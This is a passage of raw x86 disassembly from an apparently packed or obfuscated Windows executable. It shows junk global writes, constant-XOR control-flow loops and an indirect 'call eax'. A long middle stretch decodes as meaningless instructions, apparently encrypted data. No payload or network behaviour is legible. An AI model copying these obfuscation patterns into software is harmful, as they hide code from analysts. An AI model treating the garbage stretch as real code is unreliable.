  40f9e5:	add    DWORD PTR ds:0x433623,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433597,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x4335db,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x433547,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x43365f
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x4335e3,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x433633,0x4335a7
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43361b,0x6006
  40fa66:	xor    esi,eax
  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x4335af,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43361b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x4335a3,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x43355f,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x43355f,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x43355f
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	out    dx,eax
  40fae1:	in     al,dx
  40fae2:	hlt    
  40fae3:	or     DWORD PTR ds:0xae7c7cb3,edi
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40faee
  40faed:	xchg   esi,eax
  40faee:	xchg   DWORD PTR [ecx-0x30],esi
  40faf1:	mov    esi,0xf381c819
  40faf6:	adc    eax,edx
  40faf8:	fimul  DWORD PTR [esi-0xa]
  40fafb:	xlat   BYTE PTR ds:[ebx]
  40fafc:	adc    BYTE PTR [esi+edx*8],0x78
  40fb00:	fcom   DWORD PTR [edx]
  40fb02:	cmp    eax,0xcb2fea98
  40fb07:	or     DWORD PTR [ecx+0xe],eax
  40fb0a:	lds    esi,FWORD PTR [esi+0x79]
  40fb0d:	dec    edx
  40fb0e:	call   0xdf77:0x2d25dead
  40fb15:	sbb    al,0x79
  40fb17:	pop    ecx
  40fb18:	add    BYTE PTR [eax-0x52],bl
  40fb1b:	in     eax,0x4
  40fb1d:	in     al,dx
  40fb1e:	retf   
  40fb1f:	mov    ds:0x36da40ac,al
  40fb24:	scas   al,BYTE PTR es:[edi]
  40fb25:	or     al,0xc2
  40fb27:	lahf   
  40fb28:	push   0x67a11b08
  40fb2d:	mov    ss,esp
  40fb2f:	sbb    ah,BYTE PTR [eax+0x1f9d0362]
  40fb35:	mov    DWORD PTR [edx+0x4c82543c],edx
  40fb3b:	sub    DWORD PTR [esi],eax
  40fb3d:	inc    BYTE PTR [eax-0x3a]
  40fb40:	cwde   
  40fb41:	hlt    
  40fb42:	dec    ebp
  40fb43:	in     al,0xce
  40fb45:	mov    ch,BYTE PTR [ebx-0x63]
  40fb48:	enter  0x9240,0x6e
  40fb4c:	sahf   
  40fb4d:	pop    ebp
  40fb4e:	jo     0x40fad6
  40fb50:	push   esp
  40fb51:	sbb    dh,dl
  40fb53:	inc    edi
  40fb54:	lahf   
  40fb55:	mov    al,0xdf
  40fb57:	jge    0x40fb29
  40fb59:	sbb    edi,DWORD PTR [ecx]
  40fb5b:	loop   0x40fb68
  40fb5d:	das    
  40fb5e:	sar    esi,cl
  40fb60:	stc    
  40fb61:	icebp  
  40fb62:	jbe    0x40fae7
  40fb64:	mov    ecx,0xfd4994b4
  40fb69:	push   0x7b
  40fb6b:	sub    eax,0x326bd66c
  40fb70:	imul   esp,DWORD PTR [ecx-0x93ce9b9],0x6ea66563
  40fb7a:	mov    ch,0x18
  40fb7c:	mov    ch,0x6a
  40fb7e:	rcl    BYTE PTR [edx+0x5b],0x62
  40fb82:	or     DWORD PTR [ebp-0x63],ebp
  40fb85:	daa    
  40fb86:	pop    ebp
  40fb87:	das    
  40fb88:	sbb    al,ch
  40fb8a:	(bad)  
  40fb8b:	mov    ebp,0xe5b4b15a
  40fb90:	out    0xb5,al
  40fb92:	and    ebx,0x57ebd606
  40fb98:	clc    
  40fb99:	mov    ah,0x32
  40fb9b:	push   ss
  40fb9c:	sbb    al,0x94
  40fb9e:	and    eax,0x32f1286
  40fba3:	js     0x40fb97
  40fba5:	add    eax,0x2e88bcd2
  40fbaa:	and    al,0x1f
  40fbac:	test   eax,0xf762c39d
  40fbb1:	cli    
  40fbb2:	push   ecx
  40fbb3:	jg     0x40fbc6
  40fbb5:	dec    ecx
  40fbb6:	push   cs
  40fbb7:	in     al,dx
  40fbb8:	and    BYTE PTR [ecx],bh
  40fbba:	call   0x6ddc:0x646cc8ec
  40fbc1:	imul   esp,DWORD PTR [ecx],0x256da745
  40fbc7:	sbb    eax,0x6d06c4f6
  40fbcc:	or     BYTE PTR [edi-0x42],al
  40fbcf:	pop    ecx
  40fbd0:	push   edi
  40fbd1:	ins    BYTE PTR es:[edi],dx
  40fbd2:	sti    
  40fbd3:	sti    
  40fbd4:	mov    bl,0x7c
  40fbd6:	mov    edi,0x46ea7a5f
  40fbdb:	add    esp,DWORD PTR [eax]
  40fbdd:	cmp    DWORD PTR [ecx-0x1a],eax
  40fbe0:	in     eax,0x31
  40fbe2:	bound  ebx,QWORD PTR [esi]
  40fbe4:	gs jb  0x40fbf7
  40fbe7:	push   ss
  40fbe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbe9:	sbb    BYTE PTR [ebx],dl
  40fbeb:	jmp    0xc2c5:0x1764a997
  40fbf2:	call   0x60d96134
  40fbf7:	adc    eax,0x23f61b50
  40fbfc:	push   eax
  40fbfd:	mov    al,0xe5
  40fbff:	mov    ecx,0x4bf4ed70
  40fc04:	out    0xa7,al
  40fc06:	cwde   
  40fc07:	hlt    
  40fc08:	jge    0x40fba6
  40fc0a:	fistp  DWORD PTR [edx+eiz*4+0x19e100cd]
  40fc11:	inc    esi
  40fc12:	pop    ss
  40fc13:	inc    edi
  40fc14:	and    dh,BYTE PTR [esi+0x5a256317]
  40fc1a:	icebp  
  40fc1b:	sbb    DWORD PTR [edx-0x61],edx
  40fc1e:	(bad)  
  40fc1f:	xor    ah,BYTE PTR [eax]
  40fc21:	jle    0x40fbc4
  40fc23:	adc    BYTE PTR [esi-0x9e24e27],al
  40fc29:	out    0x2e,eax
  40fc2b:	push   esi
  40fc2c:	mov    cl,0x73
  40fc2e:	(bad)  
  40fc2f:	test   al,0xe0
  40fc31:	hlt    
  40fc32:	lods   eax,DWORD PTR ds:[esi]
  40fc33:	div    ebp
  40fc35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc36:	popa   
  40fc37:	enter  0x791e,0x84
  40fc3b:	call   0x2ac7a18e
  40fc40:	push   0xffffffaf
  40fc42:	mov    BYTE PTR [esi+0x10],al
  40fc45:	fnstenv [ebx+0x2f52a8c8]
  40fc4b:	xor    BYTE PTR [eax-0x14],0xd0
  40fc4f:	dec    eax
  40fc50:	and    BYTE PTR [ebx],ch
  40fc52:	mov    dh,0x35
  40fc54:	pop    eax
  40fc55:	jmp    0xfef7:0x8c78eaf
  40fc5c:	sub    BYTE PTR [esi-0x52a45abd],ah
  40fc62:	nop
  40fc63:	xchg   ebp,eax
  40fc64:	push   edi
  40fc65:	push   eax
  40fc66:	mov    eax,ss:0xae048d74
  40fc6c:	mov    al,ds:0xa4ed99ba
  40fc71:	mov    al,0x55
  40fc73:	sahf   
  40fc74:	or     eax,0xdbc67595
  40fc79:	out    0x5a,al
  40fc7b:	xor    esp,DWORD PTR [ecx+0x32420f1c]
  40fc81:	push   ss
  40fc82:	out    dx,al
  40fc83:	call   0x71cb239e
  40fc88:	inc    esp
  40fc89:	scas   eax,DWORD PTR es:[edi]
  40fc8a:	xor    al,0x47
  40fc8c:	fyl2xp1 
  40fc8e:	xchg   ecx,eax
  40fc8f:	xchg   esp,eax
  40fc90:	dec    esp
  40fc91:	test   al,0x3b
  40fc93:	mov    dh,0xb0
  40fc95:	add    esi,DWORD PTR [ebx+eiz*8]
  40fc98:	cwde   
  40fc99:	jo     0x40fc74
  40fc9b:	and    edi,eax
  40fc9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc9e:	call   0x8057:0xd9fc03a
  40fca5:	imul   edi,DWORD PTR [esi],0xffffffd4
  40fca8:	mov    ebx,0x23b04d05
  40fcad:	cmp    ecx,DWORD PTR [eax-0x77ec9068]
  40fcb3:	ja     0x40fd24
  40fcb5:	mov    dh,0x3f
  40fcb7:	sahf   
  40fcb8:	idiv   DWORD PTR [edx+edx*1+0x20dffbb5]
  40fcbf:	daa    
  40fcc0:	mov    bl,BYTE PTR [edx-0x62ccfd0a]
  40fcc6:	jl     0x40fcb4
  40fcc8:	push   edx
  40fcc9:	or     dh,ch
  40fccb:	sbb    DWORD PTR ds:0xf88a031,edx
  40fcd1:	out    0x2a,eax
  40fcd3:	pusha  
  40fcd4:	aaa    
  40fcd5:	xchg   ecx,eax
  40fcd7:	jmp    0x40fcb2
  40fcd9:	xchg   esp,eax
  40fcda:	cdq    
  40fcdb:	imul   edi,DWORD PTR [ebp+0x6d],0x2fc7cd9b
  40fce2:	inc    eax
  40fce3:	sbb    DWORD PTR [edi-0x116d1729],edx
  40fce9:	js     0x40fcb7
  40fceb:	mov    bl,0xec
  40fced:	sti    
  40fcee:	or     DWORD PTR [ebp-0x6d],0x13d4baea
  40fcf5:	jnp    0x40fcb1
  40fcf7:	pop    eax
  40fcf8:	and    DWORD PTR [ebp-0x7bbd4e59],esp
  40fcfe:	xor    ecx,esp
  40fd00:	(bad)  
  40fd01:	fimul  WORD PTR [ecx-0x6e]
  40fd04:	mov    ds:0xcb776a6c,eax
  40fd09:	call   0x2897af7e
  40fd0e:	lahf   
  40fd0f:	nop
  40fd10:	mov    edx,0x7c6c3ef6
  40fd15:	addr16 adc eax,0xaa6ccf9
  40fd1b:	(bad)  
  40fd1c:	fidiv  WORD PTR [edx+0x1a]
  40fd1f:	in     ax,dx
  40fd21:	or     BYTE PTR [esi-0x6a],dh
  40fd24:	pusha  
  40fd25:	popa   
  40fd26:	adc    al,0xbe
  40fd28:	fisttp DWORD PTR [ebp-0x29]
  40fd2b:	retf   0x8558
  40fd2e:	sbb    al,0xd2
  40fd30:	pop    edi
  40fd31:	pushf  
  40fd32:	mov    al,0x67
  40fd34:	mov    esi,0x7342a1e9
  40fd39:	rcr    BYTE PTR [esi-0x4aafe7dc],0x11
  40fd40:	inc    ebx
  40fd41:	nop
  40fd42:	jp     0x40fd3e
  40fd44:	jo     0x40fce0
  40fd46:	mov    eax,esp
  40fd48:	(bad)  
  40fd4b:	inc    esi
  40fd4c:	cs push eax
  40fd4e:	and    cl,BYTE PTR [esi]
  40fd50:	mov    esi,0x7fbdfcb1
  40fd55:	push   ds
  40fd56:	scas   al,BYTE PTR es:[edi]
  40fd57:	push   ds
  40fd58:	inc    eax
  40fd59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd5a:	push   eax
  40fd5b:	dec    ebx
  40fd5c:	add    ah,BYTE PTR [ebx-0x212c4b44]
  40fd62:	add    BYTE PTR [esi],dh
  40fd64:	popa   
  40fd65:	mov    al,0xb2
  40fd67:	(bad)
  40fd6a:	xchg   BYTE PTR [ebx-0x61f8bc50],ah
  40fd70:	int3   
  40fd71:	arpl   WORD PTR [ebx+0x78],di
  40fd74:	repnz pop ds
  40fd76:	dec    ebp
  40fd77:	scas   eax,DWORD PTR es:[edi]
  40fd78:	inc    esi
  40fd79:	add    BYTE PTR [esi-0x68],ah
  40fd7c:	test   DWORD PTR [ebx],esp
  40fd7e:	mov    WORD PTR [ecx+0x1f],es
  40fd81:	jmp    0x75be:0xf3d32093
  40fd88:	mov    ss,ecx
  40fd8a:	mov    dh,0xe6
  40fd8c:	mov    eax,0x143a773e
  40fd91:	pop    ecx
  40fd92:	adc    esp,edx
  40fd94:	inc    edx
  40fd95:	pop    es
  40fd96:	dec    edi
  40fd97:	fistp  WORD PTR [eax-0x79717a10]
  40fd9d:	mov    eax,ds:0x1511088b
  40fda2:	pop    edi
  40fda3:	xor    eax,0x418b0043
  40fda8:	cmp    al,0x8b
  40fdaa:	inc    esp
  40fdab:	or     BYTE PTR [eax],ch
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	cld    
  40fdc7:	loop   0x40fd4d
  40fdc9:	jecxz  0x40fe3a
  40fdcb:	mov    ebp,0x7eae7c7c
  40fdd0:	jl     0x40fe4e
  40fdd2:	or     edx,edx
  40fdd4:	xchg   BYTE PTR [edx-0x43669ad3],dl
  40fdda:	test   eax,0xc4858d43
  40fddf:	lock (bad) 
  40fde1:	jne    0x40fdfb
  40fde3:	xor    al,0xe2
  40fde5:	and    esp,DWORD PTR [eax]
  40fde7:	js     0x40fdae
  40fde9:	daa    
  40fdea:	dec    ebx
  40fdeb:	xchg   edx,eax
  40fdec:	jmp    0xb100:0x76205f5d
  40fdf3:	ret    0x3b1e
  40fdf6:	add    eax,0xb85fcd
  40fdfb:	or     dl,ah
  40fdfd:	xchg   esi,eax
  40fdfe:	or     DWORD PTR [eax+0x3c054a7f],ebp
  40fe04:	and    eax,0xc496c930
  40fe09:	push   esp
  40fe0a:	jmp    0x852a50f6
  40fe0f:	fs pop ebx
  40fe11:	jmp    0x40fe2e
  40fe13:	mov    bh,0x98
  40fe15:	cmp    DWORD PTR [eax+0x1],ebp
  40fe18:	pslld  mm4,mm2
  40fe1b:	mov    eax,ds:0xc59b91fe
  40fe20:	ins    BYTE PTR es:[edi],dx
  40fe21:	lahf   
  40fe22:	gs pop ebx
  40fe24:	cmp    DWORD PTR [ebx+0x53],ebx
  40fe27:	sbb    BYTE PTR [ecx+0xc13ac7a],dl
  40fe2d:	push   ecx
  40fe2e:	mov    BYTE PTR [edx+0x27],dl
  40fe31:	imul   edx,DWORD PTR [esi],0xffffff90
  40fe34:	inc    esi
  40fe35:	lahf   
  40fe36:	ret    0x900c
  40fe39:	dec    edi
  40fe3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe3b:	sbb    BYTE PTR [ebp-0x64],cl
  40fe3e:	fs dec edx
  40fe40:	cmp    DWORD PTR [esi-0x4a],0x99d4eda7
  40fe47:	fld    QWORD PTR [esi]
  40fe49:	push   0xdbe469af
  40fe4e:	xor    eax,0x920281ba
  40fe53:	call   0xc496e2b4
  40fe58:	mov    esp,edi
  40fe5a:	sub    eax,0x4c6a2009
  40fe5f:	push   cs
  40fe60:	scas   al,BYTE PTR es:[edi]
  40fe61:	in     al,dx
  40fe62:	dec    ecx
  40fe63:	cmp    BYTE PTR [edx-0x43],al
  40fe66:	xor    dh,BYTE PTR ds:0x629b287b
  40fe6c:	dec    esi
  40fe6d:	std    
  40fe6e:	nop
  40fe6f:	sub    BYTE PTR [edi+0x12],bh
  40fe72:	xchg   DWORD PTR [edi-0x2a],esi
  40fe75:	cmp    al,0xf1
  40fe78:	or     al,0xc3
  40fe7a:	mov    ecx,DWORD PTR ds:0xaa14a6dd
  40fe80:	sbb    bl,ch
  40fe82:	nop
  40fe83:	and    BYTE PTR [ebp-0x47],cl
  40fe86:	add    BYTE PTR ss:[ebx+ebp*8-0x5d],0x3c
  40fe8c:	xor    al,0xe2
  40fe8e:	ret    
  40fe8f:	test   DWORD PTR [ebx-0xc],eax
  40fe92:	aaa    
  40fe93:	bound  esi,QWORD PTR [ebx+0x7c]
  40fe96:	dec    ebx
  40fe97:	bound  ebp,QWORD PTR [eax]
  40fe99:	sar    bl,1
  40fe9b:	fimul  DWORD PTR [esi-0x30]
  40fe9e:	dec    esi
  40fe9f:	xor    DWORD PTR [eax+0x2f],esp
  40fea2:	dec    edx
  40fea3:	fidiv  WORD PTR [ebx+0x150639bb]
  40fea9:	jge    0x40fe90
  40feab:	mov    WORD PTR [edi],ss
  40fead:	jecxz  0x40fefc
  40feaf:	(bad)
  40feb2:	je     0x40ff0e
  40feb4:	xor    bh,BYTE PTR [eax]
  40feb6:	mov    al,0x44
  40feb8:	mov    ah,0xc1
  40feba:	mov    eax,DWORD PTR [ecx+0x278f3885]
  40fec0:	mov    bl,BYTE PTR [ebx+0x58]
  40fec3:	xchg   ebp,eax
  40fec4:	cmp    dh,al
  40fec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fec7:	pop    edi
  40fec8:	jae    0x40fef0
  40feca:	inc    esp
  40fecb:	or     ecx,DWORD PTR [esi]
  40fecd:	(bad)
  40fed1:	fdivp  st(5),st
  40fed3:	fimul  DWORD PTR [ebp-0x7ffb0d0f]
  40fed9:	cmc    
  40feda:	mov    edx,0x1c6e5ddc
  40fedf:	push   esi
  40fee0:	das    
  40fee1:	nop
  40fee2:	mov    al,0xa7
  40fee4:	add    BYTE PTR [edi+0x63],bh
  40fee7:	xor    eax,0x46103469
  40feec:	push   edi
  40feed:	mov    bh,0xe5
  40feef:	jl     0x40ff34
  40fef1:	xor    DWORD PTR [esi+ebp*1],0xffffffa1
  40fef5:	aas    
  40fef6:	or     BYTE PTR [bp+si],ah
  40fef9:	clc    
  40fefa:	mov    edx,0x5655859f
  40feff:	xor    ebx,DWORD PTR [ebp-0x6abc938c]
  40ff05:	cmp    ah,BYTE PTR [edi]
  40ff07:	sbb    DWORD PTR [esi+0x6],ecx
  40ff0a:	pushf  
  40ff0b:	sub    eax,0x634e1790
  40ff10:	or     ecx,esp
  40ff12:	cmc    
  40ff13:	jl     0x40fef0
  40ff15:	xchg   esp,eax
  40ff16:	pop    ecx
  40ff17:	(bad)  
  40ff18:	xor    eax,0x49d6c5c6
  40ff1d:	dec    ebp
  40ff1e:	frndint 
  40ff20:	or     eax,0xba899b8c
  40ff25:	mov    DWORD PTR [edx+0x4a],0x8cf85114
  40ff2c:	out    0x48,al
  40ff2e:	cwde   
  40ff2f:	stos   DWORD PTR es:[edi],eax
  40ff30:	cdq    
  40ff31:	into   
  40ff32:	mov    ds:0x4e4b9863,eax
  40ff37:	clc    
  40ff38:	and    DWORD PTR [eax-0x16],ebx
  40ff3b:	xchg   ebp,eax
  40ff3c:	xor    eax,0x3b30e20a
  40ff41:	out    dx,al
  40ff42:	loope  0x40ffa8
  40ff44:	jmp    0x40ffb5
  40ff46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff47:	inc    esi
  40ff48:	mov    ds:0xfb146897,eax
  40ff4d:	std    
  40ff4e:	pop    ecx
  40ff4f:	ret    
  40ff50:	adc    eax,DWORD PTR [edi]
  40ff52:	push   ebx
  40ff53:	call   0x4a2c:0xa9c27130
  40ff5a:	jecxz  0x40ff27
  40ff5c:	adc    BYTE PTR [eax-0x6f098807],ah
  40ff62:	inc    esi
  40ff63:	jno    0x40ffbf
  40ff65:	sahf   
  40ff66:	push   edx
  40ff67:	test   al,0x2d
  40ff69:	push   ds
  40ff6a:	pop    ecx
  40ff6b:	mov    ebx,0x2fad7c86
  40ff70:	mov    ds:0xfe02fc24,al
  40ff75:	xor    BYTE PTR [ebp+0x5b82cff],dh
  40ff7b:	test   ch,0xd3
  40ff7e:	cli    
  40ff7f:	ret    0x7c75
  40ff82:	dec    esp
  40ff83:	mov    esi,0x75eb05fb
  40ff88:	xchg   edi,eax
  40ff89:	add    edi,DWORD PTR [esi]
  40ff8b:	and    DWORD PTR [edx-0x2d],ebx
  40ff8e:	mov    esi,0xab222a12
  40ff93:	mov    edx,0xdbf96212
  40ff98:	sahf   
  40ff99:	nop
  40ff9a:	dec    ebp
  40ff9b:	push   0xb24b94eb
  40ffa0:	and    eax,0x9f1ae0c4
  40ffa5:	jae    0x40ff34
  40ffa7:	adc    al,0x8a
  40ffa9:	add    dh,BYTE PTR [ebx+0xd]
  40ffac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffad:	repnz call 0xc9ee:0xa47a7280
  40ffb5:	push   esi
  40ffb6:	mov    edx,eax
  40ffb8:	cmc    
  40ffb9:	sub    DWORD PTR [edi+0x1f],edi
  40ffbc:	xor    BYTE PTR [edx+0x18],bl
  40ffbf:	fstp   QWORD PTR [edi-0x2f]
  40ffc2:	sbb    al,0xc7
  40ffc4:	dec    eax
  40ffc5:	sbb    ebx,DWORD PTR [ebp-0x1594c3b7]
  40ffcb:	xchg   esp,eax
  40ffcc:	or     dl,BYTE PTR [ebx+0x78]
  40ffcf:	push   edi
  40ffd0:	scas   al,BYTE PTR es:[edi]
  40ffd1:	jns    0x410041
  40ffd3:	in     eax,0x57
  40ffd5:	cld    
  40ffd6:	(bad)
  40ffda:	(bad)  
  40ffdb:	xor    DWORD PTR [edi-0x70],ebx
  40ffde:	std    
  40ffdf:	leave  
  40ffe0:	cmp    BYTE PTR [bx+0x7b],dh
  40ffe4:	and    BYTE PTR [esi+0x1c],dl
  40ffe7:	out    dx,eax
  40ffe8:	sbb    BYTE PTR [edi],bl
  40ffea:	add    bl,BYTE PTR [edi-0x42e88122]
  40fff0:	sbb    eax,esi
  40fff2:	scas   eax,DWORD PTR es:[edi]
  40fff3:	xchg   edx,eax
  40fff4:	shl    BYTE PTR [ebx-0x454cb29a],cl
  40fffa:	mov    edi,0x2fc9103a
  40ffff:	add    edx,esp
  410001:	jb     0x40ffc1
  410003:	leave  
  410004:	imul   esi,DWORD PTR [esi+0x38],0x6d
  410008:	(bad)  [eax-0x4bd10c5e]
  41000e:	xor    dh,ah
  410010:	inc    edx
  410011:	popa   
  410012:	adc    DWORD PTR [ecx-0x53a10792],edx
  410018:	push   ss
  410019:	fwait
  41001a:	(bad)
  41001d:	aas    
  41001e:	xor    dl,dl
  410020:	fiadd  DWORD PTR [esi-0x43]
  410023:	pop    ss
  410024:	js     0x41004e
  410026:	aaa    
  410027:	or     DWORD PTR [esi+edi*2-0x30],edx
  41002b:	icebp  
  41002c:	adc    DWORD PTR [ecx],ecx
  41002e:	popf   
  41002f:	fcmovnbe st,st(6)
  410031:	cmp    eax,0xd2ee0371
  410036:	nop
  410037:	(bad)  
  410038:	xchg   ebx,eax
  410039:	cmp    DWORD PTR [ecx],0x97c78a4b
  41003f:	mov    WORD PTR [ecx],fs
  410041:	(bad)  
  410042:	arpl   bp,dx
  410044:	mov    cl,0x36
  410046:	ja     0x40ffc8
  410048:	add    eax,0x4e9f2697
  41004d:	and    ch,BYTE PTR [ebx]
  41004f:	push   edx
  410050:	inc    edi
  410051:	pop    es
  410052:	lahf   
  410053:	xchg   ebx,eax
  410054:	(bad)  [ebp+0x43]
  410057:	in     eax,0x9b
  410059:	(bad)
  41005c:	sahf   
  41005d:	jp     0x4100d6
  41005f:	fsubr  st,st(6)
  410061:	pop    esp
  410062:	xor    BYTE PTR [ebp+0x216c7338],al
  410068:	cmp    al,0x5a
  41006a:	fsub   DWORD PTR ds:0x5c0a65f3
  410070:	pop    ecx
  410071:	mov    bl,0xcc
  410073:	shr    BYTE PTR gs:[ebp+ebx*1-0x4c],1
  410078:	push   ss
  410079:	out    dx,eax
  41007a:	mov    edi,?
  41007c:	shl    edi,cl
  41007e:	jle    0x41008d
  410080:	xchg   esp,eax
  410081:	push   ebx
  410082:	jl     0x410014
  410084:	mov    eax,DWORD PTR [ebp+0x10]
  410087:	pop    esi
  410088:	test   eax,eax
  41008a:	je     0x4100ae
  410090:	push   DWORD PTR ds:0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x4335df,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x4335df
  4100d6:	inc    eax
  4100d7:	mov    ds:0x4335df,eax
  4100dc:	cmp    DWORD PTR ds:0x4335df,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x4335df,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x4335df,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x4335df
  410111:	inc    eax
  410112:	mov    ds:0x4335df,eax
  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x433673
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x433557,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x4335df,0x4335e3
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x43354f,0x433547
  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x4335e7,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x433623,0x433657
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x433657,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433597
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x433623,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x433557,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x433677
  4101b6:	mov    esi,DWORD PTR ds:0x43368b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x433563,0x43359b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x433633,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x433633
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x433633,ecx
  4101f0:	cmp    DWORD PTR ds:0x433633,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433814
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x433633,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x433663,edi
  410254:	xor    esi,esi
  410256:	and    DWORD PTR ds:0x433657,0x0
  410260:	mov    ecx,DWORD PTR ds:0x433657
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x433657,ecx
  41026d:	cmp    DWORD PTR ds:0x433657,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x433657,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x433657
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x433657,ecx
  4102a4:	cmp    DWORD PTR ds:0x433657,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
